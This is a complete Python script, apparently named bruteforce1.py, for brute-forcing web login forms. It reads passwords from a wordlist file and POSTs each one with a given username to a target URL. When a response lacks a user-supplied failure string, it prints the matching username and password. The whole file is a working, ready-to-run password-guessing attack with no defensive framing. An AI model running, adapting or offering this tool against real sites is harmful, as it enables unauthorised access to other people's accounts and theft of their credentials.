import requests
import sys
import os

def cracking(username, url, passwdfile, fail_string):
    try:
        # Open and read the password file
        with open(passwdfile, 'r') as passwords:
            for password in passwords:
                password = password.strip()
                print('Trying: ' + password)
                data = {'username': username, 'password': password, 'Login': 'submit'}
                # Send POST request
                response = requests.post(url, data=data)
                if fail_string in response.content.decode():
                    continue
                else:
                    print('Found username ==> ' + username)
                    print('Found password ==> ' + password)
                    exit()
        print('No match found')
    except FileNotFoundError:
        print(f"Error: Password file '{passwdfile}' not found.")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"Error: Failed to connect to the URL. Details: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # Check if the correct number of arguments are provided
    if len(sys.argv) != 5:
        print("Usage: python bruteforce1.py <url> <username> <password_file> <fail_string>")
        sys.exit(1)

    # Extract arguments
    url = sys.argv[1]
    username = sys.argv[2]
    passwdfile = sys.argv[3]
    fail_string = sys.argv[4]

    # Validate the password file
    if not os.path.isfile(passwdfile):
        print(f"Error: Password file '{passwdfile}' does not exist.")
        sys.exit(1)

    # Start cracking
    cracking(username, url, passwdfile, fail_string)
